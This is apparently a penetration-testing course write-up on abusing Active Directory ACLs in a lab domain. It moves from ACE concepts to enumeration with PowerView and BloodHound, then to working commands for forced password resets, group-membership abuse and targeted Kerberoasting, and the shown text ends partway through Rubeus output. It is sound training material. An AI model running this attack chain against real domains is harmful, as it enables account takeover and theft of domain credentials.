# Table of Contents

- [Access Control List (ACL) Abuse Primer](#access-control-list-acl-abuse-primer)
  - [Access Control List (ACL) Overview](#access-control-list-acl-overview)
  - [Access Control Entries (ACEs)](#access-control-entries-aces)
  - [Why are ACEs Important?](#why-are-aces-important)
  - [ACL Attacks in the Wild](#acl-attacks-in-the-wild)
- [ACL Enumeration](#acl-enumeration)
  - [Enumerating ACLs with PowerView](#enumerating-acls-with-powerview)
  - [Alternative Approach: Built-in Cmdlets](#alternative-approach-built-in-cmdlets)
  - [Enumerating ACLs with BloodHound](#enumerating-acls-with-bloodhound)
- [ACL Abuse Tactics](#acl-abuse-tactics)
  - [Abusing ACLs](#abusing-acls)
  - [Cleanup](#cleanup)
- [DCSync](#dcsync)

---

# Access Control List (ACL) Abuse Primer

For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.

---

## Access Control List (ACL) Overview

ACLs define who can access resources and their permission levels. Settings within ACLs are called Access Control Entries (ACEs), which map to users, groups, or processes and specify their granted rights. Objects can have multiple ACEs since multiple principals may need access. ACLs also enable auditing.

**Two ACL Types:**

1. **Discretionary Access Control List (DACL)** - determines which principals are granted or denied object access through allow/deny ACEs. When access is attempted, the system checks the DACL for permissions. No DACL = full rights for everyone; DACL without ACEs = access denied to all.

2. **System Access Control Lists (SACL)** - enables administrators to log access attempts to secured objects.

We see the ACL for the user account `forend` in the image below. Each item under `Permission entries` makes up the `DACL` for the user account, while the individual entries (such as `Full Control` or `Change Password`) are ACE entries showing rights granted over this user object to various users and groups.

**Viewing forend's ACL**
<img width="1393" height="639" alt="image" src="https://github.com/user-attachments/assets/a34559d0-034c-43a6-9204-f5a0d0769c86" />

The SACLs can be seen within the `Auditing` tab.

**Viewing the SACLs through the Auditing Tab**
<img width="1393" height="636" alt="image" src="https://github.com/user-attachments/assets/64267f42-121a-462b-b229-61c1ccf589c0" />

---

## Access Control Entries (ACEs)

As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are `three` main types of ACEs that can be applied to all securable objects in AD:

|ACE	|Description|
|-|-|
|`Access denied ACE`	|Used within a DACL to show that a user or group is explicitly denied access to an object|
|`Access allowed ACE`	|Used within a DACL to show that a user or group is explicitly granted access to an object|
|`System audit ACE`	|Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred|

Each ACE is made up of the following `four` components:

1. The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
2. A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
3. A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
4. An access mask which is a 32-bit value that defines the rights granted to an object

We can view this graphically in `Active Directory Users and Computers (ADUC)`. In the example image below, we can see the following for the ACE entry for the user `forend`:

**Viewing Permissions through Active Directory Users & Computers**
<img width="1394" height="637" alt="image" src="https://github.com/user-attachments/assets/f8d6dda9-0809-44fe-9e2c-d6988c4798e0" />

1. The security principal is Angela Dunn (adunn@inlanefreight.local)
2. The ACE type is `Allow`
3. Inheritance applies to the "This object and all descendant objects,” meaning any child objects of the `forend` object would have the same permissions granted
4. The rights granted to the object, again shown graphically in this example

When access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.

## Why are ACEs Important?

Attackers exploit ACEs for access escalation and persistence. For penetration testers, ACEs are valuable because:
- Organizations often don't track ACEs applied to objects or understand their impact
- Vulnerability scanners can't detect them
- They frequently go unnoticed for years, especially in complex environments
- They enable lateral/vertical movement and potential domain compromise when common AD misconfigurations are already patched

**Common Abusable AD Permissions** (enumerable via BloodHound, exploitable with PowerView):
* `ForceChangePassword` → `Set-DomainUserPassword`
* `Add Members` → `Add-DomainGroupMember`
* `GenericAll` → `Set-DomainUserPassword` or `Add-DomainGroupMember`
* `GenericWrite` → `Set-DomainObject`
* `WriteOwner` → `Set-DomainObjectOwner`
* `WriteDACL` → `Add-DomainObjectACL`
* `AllExtendedRights` → `Set-DomainUserPassword` or `Add-DomainGroupMember`
* `AddSelf` → `Add-DomainGroupMember`

In this section, we will cover enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:

* [ForceChangePassword](https://bloodhound.specterops.io/resources/edges/force-change-password#forcechangepassword) - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
* [GenericWrite](https://bloodhound.specterops.io/resources/edges/generic-write#genericwrite) - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
* [AddSelf](https://bloodhound.specterops.io/resources/edges/add-self#addself) - shows security groups that a user can add themselves to.
* [GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all#genericall) - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

This graphic, shows an excellent breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable). 

<img width="1229" height="566" alt="image" src="https://github.com/user-attachments/assets/4fdb6d93-0992-40f7-b2ba-e77ca7c695e0" />

Beyond common ACEs, you'll encounter many other AD privileges. Your enumeration methodology using BloodHound, PowerView, and built-in AD tools should be flexible enough to handle unfamiliar privileges.

**Example Scenarios:**
- [ReadGMSAPassword edge](https://bloodhound.specterops.io/resources/edges/read-gmsa-password): Indicates rights to read Group Managed Service Account passwords. Exploit using tools like [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) to obtain credentials.
- **Extended rights** (e.g., [Unexpire-Password](https://learn.microsoft.com/en-us/windows/win32/adschema/r-unexpire-password), [Reanimate-Tombstones](https://learn.microsoft.com/en-us/windows/win32/adschema/r-reanimate-tombstones)): Discovered via PowerView but may require research to determine exploitation methods.

**Best Practice:** Familiarize yourself with all [BloodHound edges](https://bloodhound.specterops.io/resources/edges/overview) and as many AD [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) as possible—less common privileges can appear during assessments and provide critical attack paths.

---

## ACL Attacks in the Wild

**Use Cases:**
- Lateral movement
- Privilege escalation  
- Persistence

**Common Attack Scenarios:**

| Attack | Description |
|--------|-------------|
| **Abusing forgot password permissions** | Help Desk/IT users often have password reset privileges. Compromising such accounts enables password resets for more privileged domain accounts. |
| **Abusing group membership management** | Staff with add/remove rights for groups can potentially add controlled accounts to privileged built-in AD groups or groups with interesting privileges. |
| **Excessive user rights** | Objects often have excessive rights from software installations (e.g., Exchange), legacy configurations, or convenience-based decisions that grant unintended permissions. |

**Important Notes:**
- Some ACL attacks are **destructive** (password changes, AD modifications). Always obtain **written client approval** before executing.
- **Document thoroughly**: Record all attacks start-to-finish and revert all changes.
- Clearly highlight modifications in reports so clients can verify proper reversion.

---

# ACL Enumeration

Let's jump into enumerating ACLs using PowerView and walking through some graphical representations using BloodHound. We will then cover a few scenarios/attacks where the ACEs we enumerate can be leveraged to gain us further access in the internal environment.

## Enumerating ACLs with PowerView

We can use PowerView to enumerate ACLs, but the task of digging through all of the results will be extremely time-consuming and likely inaccurate. For example, if we run the function `Find-InterestingDomainAcl` we will receive a massive amount of information back that we would need to dig through to make any sense of:

### Using Find-InterestingDomainAcl

```
PS C:\htb> Find-InterestingDomainAcl

ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : ab721a53-1e2f-11d0-9819-00aa0040529b
AceFlags                : ContainerInherit
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189
IdentityReferenceName   : Exchange Windows Permissions
IdentityReferenceDomain : INLANEFREIGHT.LOCAL
IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security 
                          Groups,DC=INLANEFREIGHT,DC=LOCAL
IdentityReferenceClass  : group

ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : 00299570-246d-11d0-a768-00aa006e0529
AceFlags                : ContainerInherit
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189
IdentityReferenceName   : Exchange Windows Permissions
IdentityReferenceDomain : INLANEFREIGHT.LOCAL
IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security 
                          Groups,DC=INLANEFREIGHT,DC=LOCAL
IdentityReferenceClass  : group

<SNIP>
```

If we try to dig through all of this data during a time-boxed assessment, we will likely never get through it all or find anything interesting before the assessment is over. Now, there is a way to use a tool such as PowerView more effectively -- by performing targeted enumeration starting with a user that we have control over. Let's focus on the user `wley`, which we obtained earlier. Let's dig in and see if this user has any interesting ACL rights that we could take advantage of. We first need to get the SID of our target user to search effectively.

```
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley
```

Without the `ResolveGUIDs` flag, results show non-human-readable GUID values in the `ObjectAceType` property. For example, `ExtendedRight` won't clearly indicate what ACE entry `wley` has over `damundsen` without GUID resolution.

**Note:** This command takes considerable time, especially in large environments.

### Using Get-DomainObjectACL

```
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None
```

We could Google for the GUID value `00299570-246d-11d0-a768-00aa006e0529` and uncover [this](https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) page showing that the user has the right to force change the other user's password. Alternatively, we could do a reverse search using PowerShell to map the right name back to the GUID value.

**Note: Note that if PowerView has already been imported, the cmdlet shown below will result in an error. Therefore, we may need to run it from a new PowerShell session.**

### Performing a Reverse Search & Mapping to a GUID Value

```
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
```

This gave us our answer, but would be highly inefficient during an assessment. PowerView has the `ResolveGUIDs` flag, which does this very thing for us. Notice how the output changes when we include this flag to show the human-readable format of the `ObjectAceType` property as `User-Force-Change-Password`.

### Using the -ResolveGUIDs Flag

```
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

### Why Learn Manual Methods?

**Critical Reasons:**

1. **Understanding tool mechanics** - Know what's happening behind the scenes
2. **Backup methods** - Alternative approaches when tools fail or are blocked
3. **Environmental restrictions** - Client systems may only have built-in tools available without ability to import custom tools
4. **Professional differentiation** - Demonstrates deeper expertise beyond tool dependency

## Alternative Approach: Built-in Cmdlets

Using `Get-Acl` and `Get-ADUser` cmdlets (commonly available on client systems) provides the same results without PowerView.

This knowledge is invaluable during assessments where you're restricted to native Windows tools and cannot deploy third-party utilities.

This example is not very efficient, and the command can take a long time to run, especially in a large environment. It will take much longer than the equivalent command using PowerView. In this command, we've first made a list of all domain users with the following command:

### Creating a List of Domain Users

```
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

We then read each line of the file using a `foreach` loop, and use the `Get-Acl` cmdlet to retrieve ACL information for each domain user by feeding each line of the `ad_users.txt` file to the `Get-ADUser` cmdlet. We then select just the `Access property`, which will give us information about access rights. Finally, we set the `IdentityReference` property to the user we are in control of (or looking to see what rights they have), in our case, `wley`.

### A Useful foreach Loop

```
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana 
                        Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
InheritanceType       : All
ObjectType            : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : INLANEFREIGHT\wley
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```

Once we have this data, we could follow the same methods shown above to convert the GUID to a human-readable format to understand what rights we have over the target user.

So, to recap, we started with the user `wley` and now have control over the user `damundsen` via the `User-Force-Change-Password` extended right. Let's use Powerview to hunt for where, if anywhere, control over the `damundsen` account could take us.

### Further Enumeration of Rights Using damundsen

```
PS C:\htb> $sid2 = Convert-NameToSid damundsen
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
AccessMask            : 131132
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

Now we can see that our user `damundsen` has `GenericWrite` privileges over the `Help Desk Level 1` group. This means, among other things, that we can add any user (or ourselves) to this group and inherit any rights that this group has applied to it. A search for rights conferred upon this group does not return anything interesting.

Let's look and see if this group is nested into any other groups, remembering that nested group membership will mean that any users in group A will inherit all rights of any group that group A is nested into (a member of). A quick search shows us that the `Help Desk Level 1` group is nested into the `Information Technology` group, meaning that we can obtain any rights that the `Information Technology` group grants to its members if we just add ourselves to the `Help Desk Level 1` group where our user `damundsen` has `GenericWrite` privileges.

### Investigating the Help Desk Level 1 Group with Get-DomainGroup

```
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

memberof                                                                      
--------                                                                      
CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

Let's recap where we're at:

* We have control over the user `wley` (hash captured via Responder, cracked with Hashcat)
* We enumerated objects that the user wley has control over and found that we could force change the password of the user damundsen: `ForceChangePassword` on user `damundsen`
* From here, we found that the `damundsen` user can add a member to the `Help Desk Level 1` group using `GenericWrite` privileges
* The `Help Desk Level 1` group is nested into the `Information Technology` group, which grants members of that group any rights provisioned to the `Information Technology` group

**Next Step:**
Using `Get-DomainObjectACL`, we discover `Information Technology` group members have `GenericAll` rights over user `adunn`, which means we could:
* Modify group membership
* Force password change
* Perform targeted Kerberoasting attack (crack password if weak)

### Investigating the Information Technology Group

```
PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

Finally, let's see if the `adunn` user has any type of interesting access that we may be able to leverage to get closer to our goal.

### Looking for Interesting Access

```
PS C:\htb> $adunnsid = Convert-NameToSid adunn 
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

<SNIP>
```

The output above shows that our `adunn` user has `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-In-Filtered-Set` rights over the domain object. This means that this user can be leveraged to perform a DCSync attack.

---

## Enumerating ACLs with BloodHound

After manually enumerating the attack path using PowerView and PowerShell cmdlets, we can see how much easier BloodHound makes this process. Upload the SharpHound data to BloodHound, then set `wley` as the starting node. In the `Node Info` tab, scroll to `Outbound Control Rights` to view objects we control directly, via group membership, and through ACL attack paths under `Transitive Object Control`. Clicking `1` next to `First Degree Object Control` reveals the `ForceChangePassword` right over the `damundsen` user that we enumerated earlier.

**Viewing Node Info through BloodHound**
<img width="1450" height="714" alt="image" src="https://github.com/user-attachments/assets/87d11def-f1d0-4cc1-8bda-eccbae7de33e" />

If we right-click on the line between the two objects, a menu will pop up. If we select `Help`, we will be presented with help around abusing this ACE, including:
* More info on the specific right, tools, and commands that can be used to pull off this attack
* Operational Security (Opsec) considerations
* External references.

**Investigating ForceChangePassword Further**
<img width="900" height="347" alt="image" src="https://github.com/user-attachments/assets/16c7659f-bc50-4b63-960e-155d09bf0466" />

If we click on the `16` next to `Transitive Object Control`, we will see the entire path that we painstakingly enumerated above. From here, we could leverage the help menus for each edge to find ways to best pull off each attack.

**Viewing Potential Attack Paths through BloodHound**
<img width="2044" height="815" alt="image" src="https://github.com/user-attachments/assets/9da2b8ff-7061-4e3f-a6f6-dbddcdd7931f" />

Finally, we can use the pre-built queries in BloodHound to confirm that the `adunn` user has DCSync rights.

**Viewing Pre-Build queries through BloodHound**
<img width="2068" height="817" alt="image" src="https://github.com/user-attachments/assets/a677c268-b342-4522-85f2-dcf2b25286d2" />

---

# ACL Abuse Tactics

## Abusing ACLs

We control the `wley` user after cracking their NTLMv2 hash obtained via Responder. This access enables an attack chain leading to control of the `adunn` user, who can perform DCSync to retrieve all domain NTLM hashes and escalate to Domain/Enterprise Admin.

**Attack chain:**
1. Use `wley` to change `damundsen`'s password
2. Authenticate as `damundsen` and leverage `GenericWrite` to add our controlled user to the `Help Desk Level 1` group
3. Exploit nested group membership in `Information Technology` and use `GenericAll` rights to control `adunn`

First, authenticate as `wley` in PowerShell by creating a [PSCredential object](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.4.0&viewFallbackFrom=powershellsdk-7.0.0), then force change `damundsen`'s password. (Skip this step if already running as `wley`.)

### Creating a PSCredential Object
```
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Next, we must create a [SecureString](https://learn.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0) object which represents the password we want to set for the target user `damundsen`.

### Creating a SecureString Object
```
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Finally, we'll use the [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) PowerView function to change the user's password. We need to use the `-Credential` flag with the credential object we created for the `wley` user. It's best to always specify the `-Verbose` flag to get feedback on the command completing as expected or as much information about errors as possible. We could do this from a Linux attack host using a tool such as `pth-net`, which is part of the [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit).

### Changing the User's Password
```
PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

We can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the `wley` user that we control. Next, we need to perform a similar process to authenticate as the `damundsen` user and add ourselves to the `Help Desk Level 1` group.

### Creating a SecureString Object using damundsen

```
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

Next, we can use the Add-DomainGroupMember function to add ourselves to the target group. We can first confirm that our user is not a member of the target group. This could also be done from a Linux host using the `pth-toolkit`.

### Adding damundsen to the Help Desk Level 1 Group

```
PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

CN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Marie Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Jerrell Metzler,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Evelyn Mailloux,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Juanita Marrero,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Joseph Miller,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Wilma Funk,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Maxie Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Scott Pilcher,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Orval Wong,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=David Werner,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Alicia Medlin,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Lynda Bryant,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Tyler Traver,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Maurice Duley,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=William Struck,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Denis Rogers,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Billy Bonds,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Gladys Link,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Gladys Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Margaret Hanes,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Michael Hick,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Timothy Brown,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Nancy Johansen,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Valerie Mcqueen,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

```
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

A quick check shows that our addition to the group was successful.

### Confirming damundsen was Added to the Group

```
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

MemberName
----------
busucher
spergazed

<SNIP>

damundsen
dpayne
```

Now we can leverage our group membership to control the `adunn` user. However, if the client permits changing `damundsen`'s password but prohibits interrupting the admin account `adunn`, we can use our `GenericAll` rights for a targeted Kerberoasting attack. We'll modify the account's servicePrincipalName attribute to create a fake SPN, Kerberoast it to obtain the TGS ticket, then crack the hash offline with Hashcat.

We must authenticate as a member of `Information Technology` (inherited via `damundsen`'s membership in `Help Desk Level 1`). Use Set-DomainObject to create the fake SPN. Alternatively, from Linux, use targetedKerberoast to create a temporary SPN, retrieve the hash, and delete the SPN in one command.

### Creating a Fake SPN

```
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

If this worked, we should be able to Kerberoast the user using any number of methods and obtain the hash for offline cracking. Let's do this with Rubeus.

### Kerberoasting with Rubeus

```
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
